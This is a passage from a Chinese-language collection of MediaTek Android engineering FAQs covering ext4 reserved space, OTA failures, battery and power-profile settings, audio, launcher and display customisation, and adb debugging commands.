resv_clusters = ext4_blocks_count(EXT4_SB(sb)->s_es) >>
EXT4_SB(sb)->s_cluster_bits;

do_div(resv_clusters, 50);
resv_clusters = min_t(ext4_fsblk_t, resv_clusters, 4096);
这段code就是计算ext4预留空间大小的。EXT4_SB(sb)->s_cluster_bits的值一般为0，可以看到最终预留的空间是取分区空间的2%和4096的最小值，也就说最多会预留4096个block（4096bytes ），也就是16MB。

(1) system分区
执行busybox的stat -f /system会印出类似以下的信息:
# ./stat -f /system
File: "/system"
ID: d3609fe804970d6b Namelen: 255     Type: ext2/ext3
Block size: 4096
Blocks: Total: 380892     Free: 139835     Available: 135739
Inodes: Total: 98304      Free: 95634

这里Free - Available = 4096 blocks，即16MB，因为system分区一般size较大(大于1GB)，预留2%多半会超过16MB，因此会预留最多4096个block，即16MB。

(2)cache分区
cache分区一般size比较小，100~400MB之间，目前L版本常见的是400MB，以预留2%来计算的话，应该会预留的是8MB，以下的例子就是对应这种情况。
# ./stat -f /cache
File: "/cache"
ID: d3609fe804970d6b Namelen: 255     Type: ext2/ext3
Block size: 4096
Blocks: Total: 99186      Free: 99085      Available: 97037
Inodes: Total: 25600      Free: 25585
这里Free - Available = 2048 blocks，即8MB

(3) data分区
data分区一般size较大(大于1GB)，与system分区类似，按照理论分析应该也是要预留16MB才对，实际执行stat后的结果如下:
./stat -f /data
File: "/data"
ID: d3609fe804970d6b Namelen: 255     Type: ext2/ext3
Block size: 4096
Blocks: Total: 3232930    Free: 2911026    Available: 2902834
Inodes: Total: 827392     Free: 825699

Free - Available = 8192 blocks，即32MB
很奇怪，这里为什么变成了32MB呢?

为了防止data分区被普通的APP填满，MTK对/data分区额外做了空间预留，具体就是在init.mt6XXX.rc里面的以下这段:
on fs
write /proc/bootprof "INIT:Mount_START"
mount_all /fstab.mt6735
exec /system/bin/tune2fs -O has_journal -u 10010 -r 4096 /dev/block/platform/mtk-msdc.0/by-name/userdata

tune2fs会为uid <=10010的process再额外预留4096个blocks，即16MB。tune2fs这里会设置super block里面的s_r_blocks_count字段，这个字段在创建ext4 fs时默认值为0。

(4) Internal SD
在开启MTK_SHARED_SDCARD的情况下，Internal SD与/data会共享userdata的存储空间。但是/system/core/sdcard/sdcard.c中default会预留50MB，防止APP写internal sd时把/data填满。
#define DATA_FREE_SIZE_TH_DEFAULT (50UL*1024UL*1024UL)
如果有需求的话， 可以对这里预留的空间做客制化修改。

同样对internal sd执行stat
# ./stat -f /mnt/shell/emulated
File: "/mnt/shell/emulated"
ID: 0        Namelen: 255     Type: UNKNOWN
Block size: 4096
Blocks: Total: 3220130    Free: 2898219    Available: 2890027
Inodes: Total: 827392     Free: 825696
Free - Available = 8192 blocks，也是差32MB。

这是因为internal sd的Free和Available都是基于/data的Free和Available直接减去50MB得到的。

data Free - internal sd Free =  2911026 - 2898219 = 12807 blocks (50MB)
对于Internal SD来说，当Available为0时，这时候实际上还是可以写入数据的，直到Free为0为止。

因此建议APP call getFreeBlocks()来获取Internal SD的剩余空间，而不是getAvailableBlocks()。

而对于data来说，由于Linux Kernel会额外做限制，因此建议APP是call getAvailableBlocks()来获取/data的剩余可用空间，而不是getFreeBlocks()。 
```

## [ota]  [FAQ14893]  FOTA/OTA之後启动第三方APP出現APP Crash

```text
用FOTA下载OTA包，下载完毕更新；
更新完毕后点击多个三方APP无法进入，提示报错（这些APK都是正常安装，非预置）。

报错信息类似：
Caused by: java.io.IOException: Failed to remove obsolete file from /data/dalvik-cache/arm/data@app@jp.naver.line.android-1@base.apk@classes.dex when searching for dex file /data/app/jp.naver.line.android-1/base.apk: Permission denied

[SOLUTION] 
1. 如果apk之前有安装过，OTA升级后会检测到该apk的odex是旧的需要重新去提取，但是因为这个apk贵司长时间没有使用，L版本上默认PackageManagerService判断超过7天，则开机时不会做dexopt而报这种错误，此时一般重启之后这些apk会正常运行。

上述code中 mDexOptLRUThresholdInMills的值是7天，即若此apk上次使用时间(then=pkg.mLastPackageUsageTimeInMills)+7天还小于当前时间(now)，则此apk被判别为never不会被使用的apk，所以就不做dexopt了。那么异常时会出现上面的log。

2. 发生异常时如果点击了这几个apk且发现其无法使用（无法使用的原因可能是boot.oat有更新，此时apk的odex档是旧的，需要重新提取才可正常运行），即此时mLastPackageUsageTimeInMills会更新。
所以重新开机后这个条件if (then + mDexOptLRUThresholdInMills < now)就不会满足，即这几个apk会做dexopt，此时能够正确提取odex，这时apk能够正常运行。

3. 这是Google在L版本上的机制，不建议修改，如果需要规避，可以将i.remove();这行给注释掉，即超7天时仍可以正常提取odex.
```

## [battery]  [FAQ13439]  添加低温警告

```text
修改
alps\mediatek\packages\apps\BatteryWarning\src\com\mediatek\batterywarning\BatteryWarningActivity.java
1.
private static final int SAFETY_OVER_TIMEOUT_TYPE = 4;
//添加低温类型5
private static final int BATTERY_LOW_TEMPERATURE_TYPE = 5;

2.
static final int[]  sWarningTitle = new int[]  {
    R.string.title_charger_over_voltage,
    R.string.title_battery_over_temperature,
    R.string.title_over_current_protection,
    R.string.title_battery_over_voltage,
    R.string.title_safety_timer_timeout,
    /*添加低温字符串资源 */
    R.string.title_battery_low_temperature};
3.
private static final int[]  sWarningMsg = new int[]  {
    R.string.msg_charger_over_voltage,
    R.string.msg_battery_over_temperature,
    R.string.msg_over_current_protection,
    R.string.msg_battery_over_voltage,
    R.string.msg_safety_timer_timeout,
    /*添加低温字符串资源 */
    R.string.msg_battery_low_temperature };
4.
private final BroadcastReceiver mReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (Intent.ACTION_POWER_DISCONNECTED.equals(action)) {
            if (mType == CHARGER_OVER_VOLTAGE_TYPE
                    || mType == SAFETY_OVER_TIMEOUT_TYPE || mType == BATTERY_LOW_TEMPERATURE_TYPE /*添加低温类型*/) {
                Xlog.d(TAG, "receive ACTION_POWER_DISCONNECTED broadcast, finish");
                finish();
            }
        }
    }
};
5.
替换两个方法即可
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Intent intent = getIntent();
    mType = intent.getIntExtra("type", -1);
    Xlog.d(TAG, "onCreate, mType is " + mType);
    if (mType >= CHARGER_OVER_VOLTAGE_TYPE  && mType <= BATTERY_LOW_TEMPERATURE_TYPE/*改为低温类型*/) {
        showWarningDialog(mType);
        registerReceiver(mReceiver, new IntentFilter(
                Intent.ACTION_POWER_DISCONNECTED));
    } else {
        finish();
    }
}
protected void onDestroy() {
    super.onDestroy();
    if (mType >= CHARGER_OVER_VOLTAGE_TYPE  && mType <= BATTERY_LOW_TEMPERATURE_TYPE/*改为低温类型*/) {
        unregisterReceiver(mReceiver);
    }
}
6.字符串资源
values/strings.xml
    <string name="title_battery_low_temperature">"Low Battery Temperature"</string>
    <string name="msg_battery_low_temperature">"Your battery temperature is too low, please disconnect the charger!"</string>
values-zh_rCN/strings.xml
    <string name="title_battery_low_temperature">"电池温度过低"</string>
    <string name="msg_battery_low_temperature">"您的电池温度过低，请断开充电器!"</string>
```

## [battery]  [FAQ14661]  设置中电池耗电量排名不准确、显示有误等问题

```text
1.先按照 Power profile for Android.pptx 中的步骤对 frameworks/base/core/res/res/xml/power_profile.xml 文件中的各个参数进行测量 
<item name="battery.capacity">1000</item>此处1000即可。
2.build新版本后再次进行测试


https://source.android.google.cn/devices/tech/power/values?hl=zh-cn
测量电量值
设备制造商必须在 frameworks/base/core/res/res/xml/power_profile.xml 中提供组件的电源配置文件。

要确定电源配置文件的有关数值，请使用测量设备耗电量的硬件，并执行需要信息的各种操作。测量执行这些操作时的电量使用情况并计算各项值（在适当情况下与其他基准操作的电量消耗做对比所得的差异值）。

电源配置文件的目的在于适当地估算电量消耗情况，电源配置文件的有关数值以电流（安培）表示。Android 框架用电流乘以子系统处于激活状态的时间，并计算毫安时值，然后将此值用于评估应用/子系统消耗的电池电量。

运行 Android 7.0 及更高版本且配备蓝牙、调制解调器和 WLAN 控制器的设备可以提供从芯片组数据获得的其他电量值。

采用异构 CPU 的设备
设备电源配置文件（针对具备异构架构 CPU 核心的设备）必须包含以下额外字段：

每个集群的 CPU 总数（以 cpu.clusters.cores 表示）。
每个集群支持的 CPU 速率。
每个集群中处于激活状态的 CPU 耗电情况。
为了区分集群中激活的 CPU 耗电量和所支持的 CPU 速率耗电量，需要将集群编号附加到数组名称上。集群编号按照 CPU 核心在内核设备树中的顺序分配。例如，在具备两 (2) 个集群，拥有四 (4) 个核心的异构架构中：

cluster0 由 cpu0-3 组成
cluster1 由 cpu4-7 组成
当 Android 框架从位于 /sys/devices/system/cpu/cpu<number>/cpufreq/stats 中的 sysfs 文件中读取统计信息时，将使用以上 CPU 核心编号。

集群中激活的 CPU 以及速率示例：

<array name="cpu.active.cluster0">
<value>200</value>
<value>300</value>
<value>400</value>
</array>
<array name="cpu.speeds.cluster0">
<value>600000</value>
<value>800000</value>
<value>1200000</value>
</array>

<array name="cpu.active.cluster1">
<value>400</value>
<value>500</value>
<value>600</value>
</array>
<array name="cpu.speeds.cluster1">
<value>800000</value>
<value>1200000</value>
<value>1400000</value>
</array>

电量值
下表列出可供使用的电量值设置。要查看 AOSP 中的示例文件，请参阅 power_profile.xml。

名称 说明 示例值 备注
ambient.on 屏幕在低电耗/微光/始终打开模式（而非关闭模式）下消耗的额外电量。 大约 100 毫安 -
screen.on 屏幕以最低亮度打开时消耗的额外电量。 200 毫安 包括轻触控制器和显示屏背光。Android 的最低亮度并非是 0，而是倾向于设为 10% 或 20%。
screen.full 与处于最低亮度的屏幕相比，当屏幕处于最高亮度时消耗的额外电量。 100-300 毫安 将此值的一定比例结果（基于屏幕亮度）与 screen.on 值相加，用来计算屏幕耗电量。
wifi.on 当 WLAN 打开，但未接收、发送信号或执行扫描时消耗的额外电量。 2 毫安 -
wifi.active 通过 WLAN 发送或接收信号时消耗的额外电量。 31 毫安 -
wifi.scan WLAN 正在扫描无线接入点时消耗的额外电量。 100 毫安 -
audio 通过 DSP 进行音频解码/编码时消耗的额外电量。 大约 10 毫安 用于 DSP 音频。
video 通过 DSP 进行视频解码时消耗的额外电量。 大约 50 毫安 用于 DSP 视频。
camera.avg 用于典型相机应用的相机子系统的平均电量消耗。 600 毫安 作为当应用运行预览且每分钟捕获大约 10 张全分辨率照片时的粗略估算值。
camera.flashlight 摄像头闪光模块开启时消耗的平均电量。 200 毫安 -
gps.signalqualitybased GPS 消耗的额外电量（具体取决于信号强度）。这是一个多值条目，每个信号强度（从最弱到最强）各有一个值。 30 毫安、10 毫安 -
gps.on GPS 获取信号时消耗的额外电量。 50 毫安 -
radio.active 蜂窝无线电发送/接收信号时消耗的额外电量。 100-300 毫安 -
radio.scanning 移动网络无线装置寻呼发射塔时消耗的额外电量。 1.2 毫安 -
radio.on 蜂窝无线电开启时消耗的额外电量。多值条目，每个信号强度（无信号、弱、良好、强）各有一个值。 1.2 毫安 某些无线装置在搜索手机信号塔但未能检测到信号时会增加耗电量。随着信号强度的增加，这些值可能保持不变或变小。如果您只提供一个值，则所有强度都使用同一个值。如果您提供两个值，则第一个值在无信号时使用，第二个值用于所有其他信号强度，以此类推。
bluetooth.controller.idle 蓝牙控制器在空闲时的平均电流消耗量（毫安）。 - 这些值并不是通过预估获得的，而是从控制器的数据表中提取出来的。如果有多种接收或发送状态，则采用这些状态的平均值。此外，系统现在将收集低功耗 (LE) 和蓝牙扫描的数据。

Android 7.0 及更高版本不再将蓝牙电量值用于 bluetooth.active（通过蓝牙 A2DP 播放音频时使用）和 bluetooth.on（在蓝牙打开但处于空闲状态时使用）。
bluetooth.controller.rx 蓝牙控制器在接收信号时的平均电流消耗量（毫安）。 -
bluetooth.controller.tx 蓝牙控制器在发送信号时的平均电流消耗量（毫安）。 -
bluetooth.controller.voltage 蓝牙控制器的平均工作电压（毫伏）。 -
modem.controller.sleep 调制解调控制器在休眠时的平均电流消耗量（毫安）。 0 毫安 这些值并不是估算值，而是从控制器的数据表中提取出来的。如果有多种接收状态，则采用这些状态的平均值。如果有多种发送状态，则从 Android 9 开始支持为每种发送状态指定一个值。
modem.controller.idle 调制解调控制器在空闲时的平均电流消耗量（毫安）。 -
modem.controller.rx 调制解调控制器在接收信号时的平均电流消耗量（毫安）。 -
modem.controller.tx 调制解调控制器在以不同的 RF 发送信号时的平均电流消耗量（毫安）。这是一个多值条目，每个发射能级有一个值。 100 毫安、200 毫安、300 毫安、400 毫安、500 毫安
modem.controller.voltage 调制解调控制器的平均工作电压（毫伏）。 -
wifi.controller.idle WLAN 控制器在空闲时的平均电流消耗量（毫安）。 - 这些值并不是通过预估获得的，而是从控制器的数据表中提取出来的。如果有多种接收或发送状态，则采用这些状态的平均值。
wifi.controller.rx WLAN 控制器在接收信号时的平均电流消耗量（毫安）。 -
wifi.controller.tx WLAN 控制器在发送信号时的平均电流消耗量（毫安）。 -
wifi.controller.voltage WLAN 控制器的平均工作电压（毫伏）。 -
cpu.speeds 这是一个多值条目，以千赫 (KHz) 为单位列出 CPU 可能支持的每个速率。 125000 千赫、250000 千赫、500000 千赫、1000000 千赫、1500000 千赫 条目的数量和顺序必须与 cpu.active 中的毫安条目相一致。
cpu.idle CPU（和 SoC）处于系统挂起状态时系统消耗的总电量。 3 毫安 -
cpu.awake CPU 处于调度空闲状态（内核空闲循环）时消耗的额外电量；系统没有处于系统挂起状态。 50 毫安 您的平台可能在不同的耗电水平上存在多种空闲状态；针对时间较长的调度空闲（几毫秒）可以选择一种有代表性的空闲状态。检查您的测量设备上的电量图，并选择 CPU 耗电量最低时的样本，丢弃当 CPU 退出空闲状态时的较高耗电量样本。
cpu.active CPU 以不同速度运行时消耗的额外电量。 100 毫安、120 毫安、140 毫安、160 毫安、200 毫安 此值代表 CPU 供电通道以不同速率运行时消耗的电量。在内核中设定每个耗电量所允许的最大速率并限制 CPU 以该速率运行。条目的数量和顺序应与 cpu.speeds 中的条目的数量和顺序相一致。
cpu.clusters.cores 每个 CPU 集群所包含的核心数。 4、2 仅适用于具有异构 CPU 架构的设备。条目的数量和顺序应与适用于 cpu.active 和 cpu.speeds 的集群的条目的数量相一致。第一个条目表示 cluster0 中的 CPU 核心数，第二个条目表示 cluster1 中的 CPU 核心数，依此类推。
battery.capacity 总电池容量（以毫安时为单位）。 3000 毫安时 -
低功耗 (LE) 和蓝牙扫描
对于运行 Android 7.0 的设备，系统为低功耗 (LE) 扫描和蓝牙网络流量（例如：RFCOMM 和 L2CAP）收集数据并将这些活动与初始化应用相关联。蓝牙扫描与初始化扫描的应用有关，但批量扫描与后者无关（而是与蓝牙应用有关）。对于扫描 N 毫秒的应用，扫描耗时为 N 毫秒接收时间和 N 毫秒发射时间；所有剩余的控制器时间被分配至网络流量或蓝牙应用。
```

## [性能]  [FAQ14785]  L平台上频繁GC导致UI卡顿

```text
在L平台上频繁GC导致UI发生卡顿，通过systrace和log来判断是否是GC导致的，如果是，则可以使用下面的解决方案
[SOLUTION] 
请按照如下的修改测试：
/frameworks/base/core/jni/android_util_Binder.cpp
158static void incRefsCreated(JNIEnv* env)
159{
160    int old = android_atomic_inc(&gNumRefsCreated);
161    if (false) {  //
162        android_atomic_and(0, &gNumRefsCreated);
163        env->CallStaticVoidMethod(gBinderInternalOffsets.mClass,
164                gBinderInternalOffsets.mForceGc);
165    } else {
166        ALOGV("Now have %d binder ops", old);
167    }
168}
169
```

## [知识点]  [FAQ14778]  手机支持的Mobile Class

```text
手机支持的Mobile Class有：
1. Class_CC --> CS ONLY
2. Class_CG --> PS ONLY
3. Class_B, GSM Prefer --> CS & PS, CS Prefer
4. Class_B, GPRS Prefer --> CS & PS, PS prefer
 
对于Mobile Class，手机的默认设置应该是Class_B, GSM Prefer.
 
Mobile Class也可以通过Nvram来修改设定：


TODO : CS, PS是什么意思?
```

## [FAQ09389]  [AT] 在双卡版本中，如何在PC端发送AT命令给SIM2

```text
非SGLTE版本：
Example：
当前手机中插入两张SIM卡，3G protocol在卡槽1，如果要通过PC端对SIM2发送AT命令，需要先下：
AT+ESUO=5

同样，如果
当前手机中插入两张SIM卡，3G protocol在卡槽2，如果要通过PC端对SIM1发送AT命令，需要先下：
AT+ESUO=5

关于AT+ESUO的具体参数解释，请参考DCC上AT_DOCUMENT_Modem.docx文档中所描述。

SGLTE版本：
SGLTE比较特殊，SIM1占用了protocol1和protocol2，所以如果需要发送AT命令到protocol2的话，那么需要先下：
AT+ESPO=2

如果是SGLTE DSDS版本，想将AT命令发送给SIM2，那么需要先下：
AT+ESPO=3

关于AT+ESPO的具体参数解释，请参考DCC上AT_DOCUMENT_Modem.docx文档中所描述。

L版本：
使用AT+ESUO=4发送AT给SIM1

使用AT+ESUO=5发送AT给SIM2

在C2K项目上，如果要发送AT命令到C2K的modem，请先下：
AT+ESUO=9
```

## [FAQ14829]  [Gallery] 相册列表界面，屏幕截图在相册缩略图中的字迹模糊

```text
Fancy 界面显示的是图片缩略图，那既然是缩略图就存在不清晰的情况，而当图片上有字迹的时候，这种不清晰的情况就会表现出来。
缩略图界面的功能是图片的预览，如果需要查看清晰的图片，可以点击进入大图。
如果需要修改，可按照如下方式做改动：
在decode时提高BitmapFactory.Options中的inSampleSize，使得decode出来的图片变清晰，然后在这个基础上进行resize。

LocalImage.java的onDecodeOriginal()函数中，在
int targetSize = MediaItem.getTargetSize(type);
这句话之后添加
if (type == MediaItem.TYPE_FANCYTHUMBNAIL)
    targetSize = (int)(targetSize * 1.5f);
```

## [battery]  [FAQ14749]  在电源设置中出现红线

```text
那个红线是因为debug开关为true导致的，把BatteryHistoryChart.java中的DEBUG开关设置为false就可以了。
```

## [OTA]  [FAQ14769]  L版本OTA升级遇到error："system has been remounted R/W; reflash device to reenable OTA updates"

```text
L版本；如果有在bootable/recovery/目录下code中添加ensure_path_mounted(“/system”);
或者是在recovery mode下执行root integrity check之后，导致OTA升级失败，而且last_log中有如下error：
 
script aborted: system has been remounted R/W; reflash device to reenable OTA updates
system has been remounted R/W; reflash device to reenable OTA updates
[SOLUTION] 

可以尝试在 /bootable/recovery/roots.cpp中作如下修改：(蓝色为添加部分)
int ensure_path_mounted(const char* path) {
} else if (strcmp(v->fs_type, "ext4") == 0 ||
    strcmp(v->fs_type, "vfat") == 0) {
    if (strcmp(v->mount_point, "/system") == 0)//add
        result = mount(v->device, v->mount_point, v->fs_type, MS_NOATIME | MS_NODEV | MS_NODIRATIME | MS_RDONLY, "");//add
    else //add
        result = mount(v->device, v->mount_point, v->fs_type, MS_NOATIME | MS_NODEV | MS_NODIRATIME, "");
如果问题还是不能解决，请提eservice给Mediatek，谢谢！
```

## [性能]  [FAQ08895]  如何抓取traceview?

```text
1、手机用usb连接到电脑，打开Eclispe的DDMS界面或Android Debug Monitor，进入Device 标签页，在识别到Device并连接成功之后，用鼠标点击你要进行method profiling的process，选择之后，这个process处于深蓝色高亮状态。
2、在Device这个面板的最上方那一排button中，将鼠标悬停在button上方，有提示文字，找到"Start Method Profiling"的button，点击该button，进行profiling动作。
3、接下来你就开始操作手机，复现问题。
4、操作复现问题完了之后，还是点击刚才那个button，此时button的提示文字会变为"Stop Method Profiling"，点击之后就停止了profiling动作，也就停止了抓取traceview。
5、抓完之后会自动打开刚才所抓取的traceview文件，如果是用Eclipse，请通过Eclipse的File-> Save as 功能，将该traceview文件另存下来提供给我们分析；如果是Android Device Monitor，则将鼠标悬停在已经打开的traceview文件上，该文件的保存路径会悬浮显示在文件名上方，按照此路径将抓到的traceview文件发给我们分析即可。
```

## [audio]  [FAQ03568]  [Audio Driver]  录音最开始一段时间的数据是录不到的

```text
drop 120ms record data due to hardware pluse
[SOLUTION] 
AudioType.h中
#define CAPTURE_DROP_MS (120)
此宏规定了会drop 120ms的数据
```

## [audio]  [FAQ03685]  [Audio Common]  如何打开HD record

```text
HD record即高质量录音
打开方法如下：修改ProjectConfig.mk中
MTK_AUDIO_HD_REC_SUPPORT=yes
MTK_DUAL_MIC_SUPPORT=yes  (双mic项目才能开此项)
```

## [audio]  [FAQ03966]  [Audio Common]  通话时如何播放声音给对方听

```text
默认情况下：通话时播放声音只有本端能听到，对方听不到，如果希望对方也能听到请参考如下修改
[SOLUTION] 
AudioALSAStreamManager::AudioALSAStreamManager()中可以看到
mBGSDlGain(0xFF),
mBGSUlGain(0),
其中mBGSDlGain表示下行gain值，影响的是本端听到的声音大小
mBGSUlGain表示上行gain值，影响的是对方听到的声音大小，默认值是0，所以对方听不到
只要将mBGSUlGain改为非0值即可，最大值0xFF
```

## [audio]  [FAQ03686]  [Audio App]  录音机菜单项意义

```text
录音机菜单项意义
[SOLUTION] 
音质:
High(3gpp): AAC, stereo
Mid(3gpp): AAC, stereo //虽然和High的音频编码同为AAC但是bitrate和samplerate略差
Low(amr): AMR, mono
录音模式:
Normal: 普通录音
Meeting: 会议（近距）录音
Lecture: 远距录音
```

## [OTA]  [FAQ14782]  L版本开启MTK_SHARED_SDCARD 后OTA包放入内卡如何MOTA升级成功?

```text
L版本开启MTK_SHARED_SDCARD=yes， 并且把OTA包放入内卡，即升级包路径为：/data/media/0/update.zip，在进行MOTA升级时，重启机器会遇到一直卡在黑屏、但不会进入recovery mode的现象，仔细检查mtklog发现有如下error：
 
uncrypt : update package is /data/media/0/update.zip
uncrypt : failed to convert /data/media/0/update.zip to absolute path: Permission denied
[SOLUTION] 
解决方法：
修改\alps\device\mediatek\common\sepolicy\uncrypt.te 如下：(其中蓝色为新添加)
# ==============================================
# MTK Policy Rule
# ============
allow uncrypt misc_device:chr_file *;
allow uncrypt platformblk_device:dir *;
allow uncrypt platformblk_device:blk_file *;
allow uncrypt system_data_file:file { open read };
allow uncrypt media_rw_data_file:dir { search getattr };
allow uncrypt media_rw_data_file:file { open read getattr };
```

## [launcher]  [FAQ10259]  如何将桌面和主菜单较长的图标名称显示完整?

```text
有些APP的图标名称太长，在主菜单中显示不全，而且在桌面建立这些APP的快捷方式后，这些图标名称也会显示不全，如何将其显示完整?

[SOLUTION] 

1. 请修改styles.xml，将
<style name="WorkspaceIcon.Portrait">
    <item name="android:drawablePadding">0dp</item>
    <item name="android:paddingLeft">4dp</item>
    <item name="android:paddingRight">4dp</item>
    <item name="android:paddingTop">@dimen/app_icon_padding_top</item>
    <item name="android:paddingBottom">4dp</item>
    <item name="android:textSize">13sp</item>
</style>

修改为：
<style name="WorkspaceIcon.Portrait">
    <item name="android:drawablePadding">0dp</item>
    <item name="android:paddingLeft">4dp</item>
    <item name="android:paddingRight">4dp</item>
    <item name="android:paddingTop">@dimen/app_icon_padding_top</item>
    <item name="android:paddingBottom">4dp</item>
    <item name="android:textSize">13sp</item>
    <item name="android:singleLine">false</item>
    <item name="android:lines">2</item>
</style>

2. 请修改BubbleTextView.java的applyFromShortcutInfo方法，将
setCompoundDrawablePadding((int) ((grid.folderIconSizePx - grid.iconSizePx) / 2f));
这行代码中的参数改小为合适的值。

3. 请修改PagedViewIcon.java的applyFromApplicationInfo方法，如下：
public void applyFromApplicationInfo(AppInfo info, boolean scaleUp, PagedViewIcon.PressedCallback cb) {
    mIcon = info.iconBitmap;
    mPressedCallback = cb;
    setCompoundDrawablesWithIntrinsicBounds(null, Utilities.createIconDrawable(mIcon), null, null);
    setCompoundDrawablePadding(xxxx);//mtk add（xxxx请自行调整为合适的值）
    setText(info.title);
    setTag(info);
}
```

## [audio]  [FAQ14660]  [Audio framework]  音量警告提示框选择OK，重启后再增大音量希望还会弹出音量警告提示框

```text
目前的做法是:
音量警告提示框选择OK，重启后就不会再弹出警告提示框, 除非恢复出厂设置
 
如果希望重启后再增大音量希望还会弹出音量警告提示框
请参考如下修改:

[SOLUTION] 
 
1: 可以在 AudioService.java 的构造方法中设个变量, 比如 bool bIsFirstBoot = true;

2: 然后在 checkSafeMediaVolume 方法中, 判断此变量, 如下:

private boolean checkSafeMediaVolume(int streamType, int index, int device) {
    synchronized (mSafeMediaVolumeState) {
        //add begin
        if(bIsFirstBoot){
            mSafeMediaVolumeState = SAFE_MEDIA_VOLUME_ACTIVE;
            bIsFirstBoot = false;
        }
        //add ends
        if ((mSafeMediaVolumeState == SAFE_MEDIA_VOLUME_ACTIVE) &&
                (mStreamVolumeAlias[streamType]  == AudioSystem.STREAM_MUSIC) &&
                ((device & mSafeMediaVolumeDevices) != 0) &&
                (index > mSafeMediaVolumeIndex)) {
            return false;
        }
        return true;
    }
}
```

## [log]  [FAQ14685]  从2G log获取手机加密算法支持情况(A5 & GEA)

```text
从catcher/ELT log中解码attach request信令，即可获取手机A5/GEA加密算法的支持信息。
具体解码工具的使用可参考：
[FAQ14417] Free 3GPP decode tool使用简介
```

## [CMD]  [FAQ11459]  [AAL] 动态开关AAL功能

```text
手机连接ADB
cd sys/kernel/debug
echo aaloff>dispsys
```

## [FAQ09912]  [MT6572] 工厂模式背光测试，测试图片不是全屏显示

```text
MT6572项目，配置qHD分辨率后，在工厂模式中测试背光，显示测试图片不是全屏显示

[SOLUTION] 
默认测试资源分辨率是WVGA的，如要显示其他分辨率图片，需要在对应的工程目录中进行客制化

1、修改如下文件中的值为对应分辨率
    alps/mediatek/custom/{$project}factory/inc/cust_lcd.h
2、修改如下目录中的资源，为想要显示的对应分辨率图片 (请使用为png格式)
    alps/mediatek/custom/{$project}factory/res/images
```

## [FAQ10019]  HDMI/MHL如何修改手机默认横竖屏显示方式

```text
插入HDMI/MHL后，手机资源默认会横屏显示，如何去掉不用默认横屏显示，而根据G-sensor改变显示呢?

[SOLUTION] 
请如下修改：
PhoneWindowManager.java
(alps/frameworks/base/policy/src/com/android/internal/policy/impl)

public int rotationForOrientationLw(int orientation, int lastRotation) {
    else if (mHdmiPlugged && mHdmiRotationLock && false) {  //添加红色部分
        // Ignore sensor when plugged into HDMI.
        // Note that the dock orientation overrides the HDMI orientation.
        preferredRotation = mHdmiRotation;
    }
    . . . . . .
}
```

## [CMD]  [FAQ08763]  adb命令点亮屏幕说明

```text
之前77平台在终端输入如下两个命令屏幕就可以点亮
echo on > /sys/power/state
echo 222 > /sys/class/leds/lcd-backlight/brightness

现在89平台输入这两个命令屏幕不能点亮，请问如何可以直接在终端通过命令来点亮屏幕?

[SOLUTION] 
89以后平台和77之前的架构不一样，

可以如下操作测试：

在系统正常开启的时候，adb输入 
echo mem >/sys/power/state ==> kernel休眠
echo on >/sys/power/state  ==> kernel唤醒
echo 255 >/ sys/class/leds/lcd-backlight/brightness ==>点亮屏幕
这时候正常唤醒

在系统已经睡眠的时候，adb输入
echo on > /sys/power/state  ==> kernel唤醒
echo 255 > /sys/class/leds/lcd-backlight/brightness ==>点亮屏幕
此时可以看到，背光已经被点亮了，然后再输入
./system/bin/boot_logo_updater
可以看到可以正常输出logo，说明adb cmd是可以正常唤醒系统的，并且LCM也是正常工作的。
不过现在ovl那边系统是disable的，所以只有黑色的数据。

75和77上面直接echo on >/sys/power/state就可以正常开启系统，89上面无法显示，是89的架构不同导致的，HWC那边在睡眠的时候就会关掉OVL这边的layer，故输入power on后只能显示黑色。
```

## [FAQ04402]  如何加载LCD相应的资源保证显示正常

```text
1. 保证开机Logo可以正常显示
根据屏幕分辨率，在ProjectConfig.mk中修改宏BOOT_LOGO为相应的分辨率(如wvga/hvga/qhd……)，支持的分辨率可以在目录（Turnkey Project: mediatek/custom/common/lk/logo/）（AOSP Project：
bootable/bootloader/lk/dev/logo）中进行查找
如果在目录（Turnkey Project: mediatek/custom/common/lk/logo/）（AOSP Project：

bootable/bootloader/lk/dev/logo）中未找到屏幕相应的分辨率，请自行添加目录并添加相应的资源图片
2. 保证UI中的CP能够正常显示

需要根据屏幕分辨率，屏幕尺寸，计算DPI（dot per inch，每英寸像素数），再根据计算结果在ProjectConfig.mk中为宏MTK_PRODUCT_LOCALES添加相应的值(ldpi/mdpi/hdpi/xhdpi)

DPI计算方法
1)   利用勾股定理，计算屏幕对角线像素数 = (屏幕宽像素2+屏幕高像素2)0.5
2)   利用屏幕对角线像素数与屏幕尺寸计算DPI = 屏幕对角线像素数/屏幕尺寸
3)   以4.3英寸，720×1280屏幕为例，对角线像素数 = (7202+12802)0.5=1468.6，DPI = 1468.6/4.5 = 326.4
4)   根据dpi的值，选择适用的范围

如何根据DPI的值确定MTK_PRODUCT_LOCALES的参数，请参看下图
```

## [log]  [FAQ08889]  如何抓取hprof文件?

```text
1. 命令行方式抓取，方法如下：

a) 通过输入adb命令的方式抓取，PIDXXX为对应进程的PID：
    adb remount
    adb shell chmod 0777 /data/misc
    adb shell kill -10 PIDXXX
b) 会在/data/misc目录下生成一个以pidXXX.hprof结尾的hprof文件。
c) 然后通过adb pull或其他方式将这个文件导出来即可。

2. 通过DDMS抓取：
a) 打开Eclipse，点击device窗口的Dump Hprof file 图标(绿色圆柱体，右边一条向下红色箭头线)
b) 等几秒中会弹出保存hporf的路径，然后就可以获取到当时的hprof了。

注意：hprof只能在ENG或开启了Root的User load上来抓取，这样才是有效的。
```

## [FAQ14644]  如何将GPRS/Edge Class改为Class 10

```text
Method 1：Meta tool （Modify NVRAM）
other_LID->NVRAM_EF_CLASSMARK_RACAP_LID->1
Modify byte10 and byte12
    if byte10=0xb3,modify to byte10=0xab
    if byte10=0xb2,modify to byte10=0xaa
    byte12=0xd9, modify to byte12=0xd5

     /* BYTE 10:
                            * bit 8: multislot capability present,
                            * bit 7 ~ 3: mutlislot capability,
                            * bit 2: GPRS extended Dynamic Allocation cap =1
                            * bit 1 : RL indicator = 0 => R98 MS, 1 => R99 MS */

    /* BYTE 12: Lanslo 20060215: for selecting GPRS or EGPRS capability
                             * bit 8: PFC mode = 0b
                             * bit 7: EDGE multislot class present / EDGE support = 1b
                             * bit 6 ~ 2: EDGE multislot capability = 01100b
                             * bit 1: EDGE extended dynamic allocation capability = 1b
                             * Old value 0x80, new 0xd9(PFC on), 0x59 (PFC off) */
 Save NVRAM
